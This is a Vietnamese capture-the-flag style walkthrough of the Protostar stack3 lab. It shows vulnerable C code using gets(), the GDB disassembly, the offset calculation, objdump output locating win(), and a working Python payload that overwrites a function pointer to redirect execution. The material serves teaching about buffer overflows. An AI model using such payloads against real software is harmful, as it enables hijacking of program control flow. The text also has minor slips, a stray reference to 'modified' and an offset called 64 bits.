## Stack3
- Lần này goal vẫn là overwrite biến nhưng mà ta sẽ phải overwrite đến một địa chỉ của một hàm để thay đổi execution flow của chương trình làm cho nó chạy hàm `win`, biến cần ghi đè là `fp`, sử dụng hàm `gets`:
![](https://i.imgur.com/QZJWbCx.png)
- Source code C:
```c 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
- GDB `disass`:
```
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave  
0x08048478 <main+64>:   ret    
```
- Xác định nhanh được 2 biến `fp` và `modified` có offset là 64 bit:
```
(gdb) p ($esp+0x1c) - ($esp+0x5c)
$12 = -64
```
- Vẫn là padding 64 bytes chữ A, rồi tiếp theo là 4 bytes địa chỉ thì ta sẽ ghi đè được `fp`, nhưng vấn đề là ta tìm địa chỉ của hàm `win`. Hẳn là sẽ có debug symbol đầy đủ, lệnh `objdump -S ./stack3` sẽ giúp ta tìm địa chỉ của các lệnh assembly trong các hàm tương ứng, trong đó có hàm `win`:
```asm
user@protostar:/opt/protostar/bin$ objdump -S ./stack3
...
08048424 <win>:
 8048424:       55                      push   %ebp
 8048425:       89 e5                   mov    %esp,%ebp
 8048427:       83 ec 18                sub    $0x18,%esp
 804842a:       c7 04 24 40 85 04 08    movl   $0x8048540,(%esp)
 8048431:       e8 2a ff ff ff          call   8048360 <puts@plt>
 8048436:       c9                      leave  
 8048437:       c3                      ret    

...
```
- Vậy địa chỉ bắt đầu asm của hàm `win` là `0x08048424`, ok mảnh ghép cuối đã tìm thấy, craft payload:
```python 
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "\x24\x84\x04\x08"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$�
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

